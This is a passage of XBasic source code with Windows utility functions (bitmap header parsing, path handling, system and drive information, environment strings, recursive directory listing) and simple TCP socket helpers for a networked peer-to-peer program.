	RETURN STRING$(day)+"/"+STRING$(month)+"/"+STRING$(year)
	
END FUNCTION

FUNCTION STRING GetLocalIpA ()


	name$ = NULL$(256)
	gethostname (&name$,255)
	GetIPAddr (@name$, @ip$)	
	RETURN ip$
	
END FUNCTION

FUNCTION open_file (pfilename, flags)


	IFZ flags THEN
		type = &"rb"
	ELSE
		type = flags
	END IF
	
	in = fopen (pfilename, type)
	IFZ (in)
		'printf(&"\nunable to open file; '%s'\ncheck if path is correct.\n",pfilename)
		RETURN 0
	ELSE
		RETURN in
	END IF

END FUNCTION

FUNCTION close_file (file)

	IF file THEN
		fclose (file)
		RETURN $$TRUE
	ELSE
		'printf(&"\nunable to close file",NULL)
		RETURN $$FALSE
	END IF

END FUNCTION

FUNCTION free_memory_space (hbuffer)
	SHARED STRING membuffer
	
	
	membuffer = ""
	RETURN $$TRUE
	
	'RETURN free (hbuffer)
END FUNCTION

FUNCTION create_memory_space (totalbytes)
	SHARED STRING membuffer


	IFZ totalbytes THEN RETURN 0
	membuffer = NULL$(totalbytes+1)
	
	'pbuffer = malloc (totalbytes)
	'IFZ pbuffer THEN RETURN 0
	'RtlZeroMemory (pbuffer, totalbytes)
	
	RETURN &membuffer

END FUNCTION

FUNCTION GetImageArrayInfo (UBYTE image[], @bpp, @width, @height)


	IFZ image[] THEN RETURN ($$FALSE)
	bytes = SIZE (image[])
	iAddr = &image[]
'
	IF (bytes < 32) THEN RETURN ($$FALSE)
'
	byte0 = image[0]
	byte1 = image[1]
'
	IF ((byte0 != 'B') OR (byte1 != 'M')) THEN RETURN ($$FALSE)

	byte2 = image[2]
	byte3 = image[3]
	byte4 = image[4]
	byte5 = image[5]
	fileSize = (byte5 << 24) OR (byte4 << 16) OR (byte3 << 8) OR byte2
'
	byte14 = image[14]
	byte15 = image[15]
	byte16 = image[16]
	byte17 = image[17]
	headerSize = (byte17 << 24) OR (byte16 << 16) OR (byte15 << 8) OR byte14
'
	info = 14
'
	IF (headerSize = 12) THEN							' BITMAPCOREINFO
		w0 = image[info+4]
		w1 = image[info+5]
		h0 = image[info+6]
		h1 = image[info+7]
		b0 = image[info+10]
		b1 = image[info+11]
		width = (w1 << 8) OR w0
		height = (h1 << 8) OR h0
		bpp = (b1 << 8) OR b0
	ELSE																	' BITMAPINFO
		w0 = image[info+4]
		w1 = image[info+5]
		w2 = image[info+6]
		w3 = image[info+7]
		h0 = image[info+8]
		h1 = image[info+9]
		h2 = image[info+10]
		h3 = image[info+11]
		b0 = image[info+14]
		b1 = image[info+15]
		width = (w3 << 24) OR (w2 << 16) OR (w1 << 8) OR w0
		height = (h3 << 24) OR (h2 << 16) OR (h1 << 8) OR h0
		bpp = (b1 << 8) OR b0
	END IF

	RETURN ($$TRUE)

END FUNCTION

FUNCTION IJL_DIB_PAD_BYTES (width)

  lineWidth = width * 3
  RETURN ((lineWidth + 3) AND (NOT (3))) - lineWidth

END FUNCTION


FUNCTION getLastSlash(str$, stop)
	$PathSlash$   = "\\" 


	IF stop < 0 THEN
		slash1 = RINSTR(str$, "/")
		slash2 = RINSTR(str$, $PathSlash$)
	ELSE
		slash1 = RINSTR(str$, "/", stop)
		slash2 = RINSTR(str$, $PathSlash$, stop)
	END IF
	IFZ slash1 THEN
		RETURN slash2
	ELSE
		RETURN MAX(slash1, slash2)
	END IF
	
END FUNCTION

FUNCTION DecomposePathname (pathname$, @path$, @parent$, @filename$, @file$, @extent$)
'
	path$ = ""
	file$ = ""
	extent$ = ""
	parent$ = ""
	filename$ = ""
	name$ = TRIM$ (pathname$)
	dot = RINSTR (name$, ".")
	slash = getLastSlash(name$, -1)
	
	IF slash THEN preslash = getLastSlash(name$, slash-1)
	IF (dot < slash) THEN dot = 0
'
	filename$ = MID$ (name$, slash+1)							' filename = "name.ext"
	IFZ dot THEN
		file$ = filename$										' file = filename (filename has no extent)
	ELSE
		file$ = MID$ (name$, slash+1, dot-slash-1)	' file = "name" (without extent)
		extent$ = MID$ (name$, dot)					' extent = ".ext"
	END IF
'
	IF slash THEN
		path$ = LEFT$ (name$, slash-1)							' path = full pathname to left of "/file.ext"
		IF preslash THEN
			parent$ = MID$ (name$, preslash+1, slash-preslash-1)
		ELSE
			parent$ = LEFT$ (name$, slash-1)
		END IF
	END IF
	
END FUNCTION

FUNCTION GetCommandLineArguments (argc, argv$[]) 
	SHARED  setarg
	SHARED  setargc
	SHARED  setargv$[]


	DIM argv$[]
	inc = argc
	argc = 0
'
' return already set argc and argv$[]
'
	IF (inc >= 0) THEN
		IF setarg THEN
			argc = setargc
			upper = UBOUND (setargv$[])
			ucount = upper + 1
			IF (argc > ucount) THEN argc = ucount
			IF argc THEN
				DIM argv$[upper]
				FOR i = 0 TO upper
					argv$[i] = setargv$[i]
				NEXT i
			END IF
			RETURN ($$FALSE)
		END IF
	END IF
'
' get original command line arguments from system
'
	argc = 0
	index = 0
	DIM argv$[]
	addr = GetCommandLineA()			' address of full command line
	line$ = CSTRING$(addr)

	done = 0
	IF addr THEN
		DIM argv$[1023]
		quote = $$FALSE
		argc = 0
		empty = $$FALSE
		I = 0
		DO
			cha = UBYTEAT(addr, I)
			IF (cha < ' ') THEN EXIT DO

			IF (cha = ' ') AND NOT quote THEN
				IF NOT empty THEN
					INC argc
					argv$[argc] = ""
					empty = $$TRUE
				END IF
			ELSE
				IF (cha = '"') THEN
					quote = NOT quote
				ELSE
					argv$[argc] = argv$[argc] + CHR$(cha)
					empty = $$FALSE
				END IF
			END IF
			INC I
		LOOP
		IF NOT empty THEN
			argc = argc + 1
		END IF
		REDIM argv$[argc-1]

	END IF
'
' if input argc < 0 THEN don't overwrite current values
'
	IF ((setarg = $$FALSE) OR (inc >= 0)) THEN
		setarg = $$TRUE
		setargc = argc
		DIM setargv$[]
		IF (argc > 0) THEN
			DIM setargv$[argc-1]
			FOR i = 0 TO argc-1
				setargv$[i] = argv$[i]
			NEXT i
		END IF
	END IF
	
END FUNCTION

FUNCTION GetLocalDateAndTime (year, month, day, weekDay, hour, minute, second, nanos)
	SYSTEMTIME systemTime

	GetLocalTime (&systemTime)
	year		= systemTime.year
	month		= systemTime.month
	day			= systemTime.day
	weekDay	= systemTime.weekDay
	hour		= systemTime.hour
	minute	= systemTime.minute
	second	= systemTime.second
	'nanos		= systemTime.msec * 1000000
END FUNCTION

FUNCTION LoadString (f$, text$)

	ifile = OPEN (f$, $$RD)
	IF (ifile < 0) THEN RETURN ($$FALSE)
	fileSize = LOF(ifile)
	IF fileSize THEN
		text$ = NULL$(fileSize)
		READ [ifile], text$
	END IF
	CLOSE (ifile)
	
	RETURN ($$TRUE)
END FUNCTION

FUNCTION STRING GetServerPath()
	STRING szPath

	szPath = NULL$(513)
	GetModuleFileNameA(0, &szPath, 512)
	RETURN CSIZE$(szPath)
END FUNCTION

FUNCTION STRING GetWindowsDir()
	STRING buffer

	buffer = SPACE$(256)
	ret = GetWindowsDirectoryA (&buffer, 255)
	RETURN LEFT$(buffer, ret)
END FUNCTION

FUNCTION STRING GetSystemDir()
	STRING buffer

	buffer = SPACE$(256)
	ret = GetSystemDirectoryA (&buffer, 255)
	RETURN LEFT$(buffer, ret)
END FUNCTION
 
FUNCTION STRING GetComputerName()
	STRING buffer

	len = 256
	buffer = NULL$(len)
	GetComputerNameA (&buffer, &len)
	RETURN TRIM$(buffer)
END FUNCTION

FUNCTION STRING GetUserName()
	STRING buffer

	len = 256
	buffer = NULL$(len)
	GetUserNameA (&buffer, &len)
	RETURN LEFT$(buffer,len)
END FUNCTION

FUNCTION STRING GetDrivesB ()
	STRING buffer,drives,root,vname

	buffer = SPACE$(1024)
	ret = GetLogicalDriveStringsA (1023,&buffer)
	buffer = replace(LEFT$(buffer, ret),0,32)

	drives = ""
	DO
		root = GetTokenEx (@buffer,32,0)
		IF root THEN
			vname = NULL$(64)
			GetVolumeInformationA (&root, &vname, 64, 0, 0, 0, 0, 0)
			drives = drives+root+" "+STRING$(GetDriveTypeA(&root))+" "+CSIZE$(vname)+","
		ELSE
			EXIT DO
		END IF
	LOOP WHILE (buffer !="")
	
	RETURN drives
END FUNCTION

FUNCTION STRING GetDrives ()
	STRING buffer

	buffer = SPACE$(1024)
	ret = GetLogicalDriveStringsA (1023,&buffer)
	RETURN replace(LEFT$(buffer, ret),0,32)
END FUNCTION

FUNCTION STRING GetEnvStrings ()
	STRING buffer,env


	env	= ""
	addr = GetEnvironmentStrings()
	IF addr THEN
		DO
			IF (UBYTEAT(addr) != 0) THEN
				buffer = CSTRING$(addr)
				IFZ env THEN
					env = env + buffer
				ELSE
					env = env +"\1\2:"+ buffer
				END IF
				addr = addr + SIZE(buffer)+1
			END IF
		LOOP WHILE (UBYTEAT(addr) != 0)

		FreeEnvironmentStringsA(addr)
		RETURN env
	ELSE
		RETURN ""
	END IF
END FUNCTION

FUNCTION STRING replace (STRING text,oldc,newc)

	IFZ text THEN RETURN ""
	FOR p = 0 TO SIZE(text)-1
		IF (text{p} == oldc) THEN text{p} = newc
	NEXT p
	RETURN text
END FUNCTION

FUNCTION STRING GetDirSize (socket,STRING dir)
	SHARED totalfolders,totalfiles
	SHARED GIANT tdirsize
	STRING value


	IF WaitForSingleObject (#hsmGetDirSize,10000) == $$WAIT_TIMEOUT THEN
		RETURN "0"
	END IF
	
	IFZ dir THEN RETURN "0"
	totalfolders = 0
	totalfiles = 0
	tdirsize = 0

	FindAllInFolder (socket,"DIR",$$Tree_DirSize | $$Tree_Recursive,dir)
	value = STRING$(tdirsize)+" "+STRING$(totalfolders-1)+" "+STRING$(totalfiles)
	ReleaseSemaphore (#hsmGetDirSize,1,NULL)

	RETURN value
END FUNCTION

FUNCTION GetAllFilesInDir (socket,STRING msg,STRING dir)
	SHARED totalfolders,totalfiles


	IFZ dir THEN RETURN $$FALSE

	totalfolders = 0
	totalfiles = 0
	FindAllInFolder (socket,msg,$$Tree_Dir,dir)
	FindAllInFolder (socket,msg,$$Tree_File,dir)

	GetTokenEx(@dir,32,0)	' remove id string
	SendMsg (socket,"CMSG "+dir+" "+STRING$(totalfiles)+" files  "+STRING$(totalfolders)+" folders")

	RETURN $$TRUE
END FUNCTION 

FUNCTION FindAllInFolder (socket,STRING msg,mode,STRING location)
	WIN32_FIND_DATA wfd
	STRING folder,path
	SHARED totalfolders,totalfiles
	SHARED CONNECTED
	FSIZE fsize
	SHARED GIANT tdirsize


	id$ = GetTokenEx (@location,32,0)
	DecomposePathname (location, @path,"","", "","")
	location = location + "*"

	hWFD = FindFirstFileA (&location, &wfd)
	IF (hWFD == $$INVALID_HANDLE_VALUE) THEN RETURN $$FALSE
	DO
		IF (wfd.cFileName != ".") && (wfd.cFileName != "..") THEN
			IF (wfd.dwFileAttributes & $$FILE_ATTRIBUTE_DIRECTORY) THEN
				INC totalfolders
				IF (mode & $$Tree_Dir) THEN
					SendMsg (socket,msg+" "+id$+" "+CSTRING$(&wfd.cFileName)+"\\")
				END IF
				IF (mode & $$Tree_Recursive) THEN
					FindAllInFolder (socket,msg,mode,id$+" "+path+"\\"+CSTRING$(&wfd.cFileName)+"\\")
				END IF
			ELSE
				INC totalfiles
				IF (mode & $$Tree_File) THEN
					SendMsg (socket,msg+" "+id$+" "+CSTRING$(&wfd.cFileName))
				END IF
				IF (mode & $$Tree_DirSize) THEN
					fsize.sizeh = wfd.nFileSizeHigh
					fsize.sizel = wfd.nFileSizeLow
					tdirsize = tdirsize + fsize.tsize
				END IF
			END IF
		END IF
	LOOP WHILE (FindNextFileA (hWFD, &wfd)) && (CONNECTED == $$TRUE)

	FindClose (hWFD)
	RETURN $$TRUE
END FUNCTION

FUNCTION STRING textRemove (STRING text,chars,offset)

	text = LEFT$(text,offset) + RIGHT$(text,LEN(text)-offset-chars)
	RETURN text
END FUNCTION

FUNCTION p2pListen(socket)

	IF (listen(socket, 2) == $$SOCKET_ERROR) THEN
		RETURN $$FALSE
	ELSE
		RETURN $$TRUE
	END IF
END FUNCTION

FUNCTION p2pAccept (socket, STRING remoteaddr)
	SOCKADDR_IN  sockaddrin

	length = SIZE(sockaddrin)
	client = accept (socket, &sockaddrin, &length)
	remoteaddr = CSTRING$(inet_ntoa(sockaddrin.sin_addr))
	RETURN client
END FUNCTION

FUNCTION p2pCloseSocket (socket)
	UBYTE buffer[]


	IFZ socket THEN RETURN 0
	shutdown (socket,$$SD_SEND)
	't0 = GetTickCount()
	'DIM buffer[1023]
	'DO
	'	ret = recv(socket, &buffer[], SIZE(buffer[]), 0)
	'	IF (ret == $$SOCKET_ERROR) THEN EXIT DO
	'	IF (ret == 0) THEN EXIT DO
	'LOOP WHILE ((GetTickCount()-t0) < 1000)
	RETURN closesocket (socket)
END FUNCTION


FUNCTION GetIPAddr (IPName$, numIPAddr$)
	WSADATA wsadata
	HOSTENT	host


	IF (LEN(IPName$) < 3) THEN RETURN $$FALSE
	host = gethostbyname (&IPName$)
	IF (host.h_addr_list != 0) THEN
		addr = 0
		RtlMoveMemory (&addr, host.h_addr_list, 4)
		RtlMoveMemory (&addr, addr, 4)
		addr2 = inet_ntoa (addr)
'		length = strlen (addr2)
		numIPAddr$ = NULL$ (512)
		RtlMoveMemory (&numIPAddr$, addr2, LEN(numIPAddr$))
		numIPAddr$ = CSIZE$ (numIPAddr$)
	END IF
	
	RETURN $$TRUE
END FUNCTION

FUNCTION GetIPName (numIPAddr$, IPName$)
	WSADATA wsadata
	HOSTENT	host
	

	IF (LEN(numIPAddr$) < 3) THEN RETURN $$FALSE
	addr = inet_addr (&numIPAddr$)
	host = gethostbyaddr (&addr, 4, $$AF_INET)
	IF host.h_name != 0 THEN
		IPName$ = NULL$ (512)
		RtlMoveMemory (&IPName$, host.h_name, LEN(IPName$))
		IPName$ = CSIZE$ (IPName$)
	END IF

	RETURN $$TRUE
END FUNCTION

FUNCTION p2pBind (socket,ipaddress$,port)
	SOCKADDR_IN udtSocket

	
	udtSocket.sin_family = $$AF_INET
	udtSocket.sin_port = htons (port)
	udtSocket.sin_addr = inet_addr (&ipaddress$)

	IF (udtSocket.sin_addr == $$INADDR_NONE) THEN
		GetIPAddr (ipaddress$, @numIPAddr$)
		udtSocket.sin_addr = inet_addr (&numIPAddr$)
	END IF
	IF (bind (socket, &udtSocket, SIZE (udtSocket)) == $$SOCKET_ERROR) THEN
		''CPrint ("* wsa error: "+ STRING$(WSAGetLastError ()))
		RETURN $$FALSE
	ELSE
		RETURN $$TRUE
	END IF
	
END FUNCTION

FUNCTION p2pCreateBindSocket (addy$,port,socket)
	'SHARED EXITSTATUS


	IFZ addy$ THEN RETURN $$FALSE
	socket = socket ($$AF_INET, $$SOCK_STREAM, 0)
	IF (socket == $$SOCKET_ERROR) THEN RETURN $$FALSE
	
	ret = $$FALSE
	ct = 0
	DO
		ret = p2pBind (socket,addy$,port)
		IFF ret THEN
			Sleep(100)
			INC ct
			IF ct == 10 THEN RETURN $$FALSE
		END IF
	LOOP WHILE (ret == $$FALSE) '&& (EXITSTATUS == $$FALSE))
	
	RETURN $$TRUE
END FUNCTION 

FUNCTION p2pConnect (ipaddress$,port,socket)
	SOCKADDR_IN udtSocket

	
	udtSocket.sin_family = $$AF_INET
	udtSocket.sin_port = htons (port)
	udtSocket.sin_addr = inet_addr (&ipaddress$)

	IF udtSocket.sin_addr = $$INADDR_NONE THEN
		GetIPAddr (ipaddress$, @numIPAddr$)
		udtSocket.sin_addr = inet_addr (&numIPAddr$)
	END IF
	
	socket = socket (udtSocket.sin_family, $$SOCK_STREAM, 0)
	IF (connect (socket, &udtSocket, SIZE(udtSocket)) == $$SOCKET_ERROR) THEN
		'CPrint ("* wsa error "+ STRING$(WSAGetLastError ()))
		IF socket THEN p2pCloseSocket (socket)
		RETURN $$FALSE
	ELSE
		RETURN $$TRUE
	END IF

END FUNCTION

FUNCTION p2pListenBin (socket,size,lpbuffer)
	ULONG total


	IF !lpbuffer || !size THEN RETURN $$FALSE
	total = size

	DO
		bytesRecv = recv (socket, lpbuffer, total, 0)
		IF (bytesRecv == $$SOCKET_ERROR) THEN RETURN $$FALSE
		IF (bytesRecv == 0) THEN EXIT DO
 
		total = total - bytesRecv
		lpbuffer = lpbuffer + bytesRecv
	LOOP WHILE (total > 0)
	size = total
	
	RETURN $$TRUE
END FUNCTION

FUNCTION  MAKELONG (lo, hi)

	RETURN lo | (hi << 16)

END FUNCTION

END PROGRAM
